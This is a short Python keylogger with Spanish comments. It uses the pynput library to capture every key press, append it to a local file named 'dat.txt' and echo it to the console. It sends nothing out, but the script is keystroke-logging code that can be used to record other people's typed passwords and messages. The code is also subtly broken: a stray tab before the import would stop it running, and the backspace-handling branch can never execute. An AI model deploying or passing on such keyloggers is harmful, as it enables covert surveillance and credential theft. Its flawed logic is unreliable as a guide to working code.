
#!/usr/bin/env python
	from pynput import keyboard

# Archivo de registro
log_file = "dat.txt"
current_text = ""

def on_key_press(key):
	global current_text
	try:
		# Convierte la tecla presionada en una cadena
		key_str = str(key.char)
	except AttributeError:
		# Si la tecla no es imprimible, la representamos con su nombre
		key_str = f"\n[{key}]\n"

	if key != keyboard.Key.backspace:
		# Si no se presiona "Retroceso", agrega la tecla a la secuencia actual
		current_text += key_str
		
	elif key != keyboard.Key.shift_l and key != keyboard.Key.shift_r:      
		current_text += key_str
	else:
		# Si se presiona "Retroceso", elimina el último carácter del archivo
		remove_last_character_from_file(log_file)

	# Muestra la tecla en la consola
	print(f"Se ha pulsado: {key_str}")

	# Guarda la tecla en el archivo de registro
	with open(log_file, "a") as file:
		if key != keyboard.Key.backspace:
			file.write(key_str)
		elif key != keyboard.Key.shift_l and key != keyboard.Key.shift_r:
			file.write(key_str)

def on_key_release(key):
	pass  # No hacemos nada cuando se libera una tecla

def remove_last_character_from_file(file_path):
	with open(file_path, "r") as file:
		content = file.read()
	
	if content:
		content = content[:-1]  # Elimina el último carácter
	
	with open(file_path, "w") as file:
		file.write(content)

# Configura el listener de teclado
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
	listener.join()




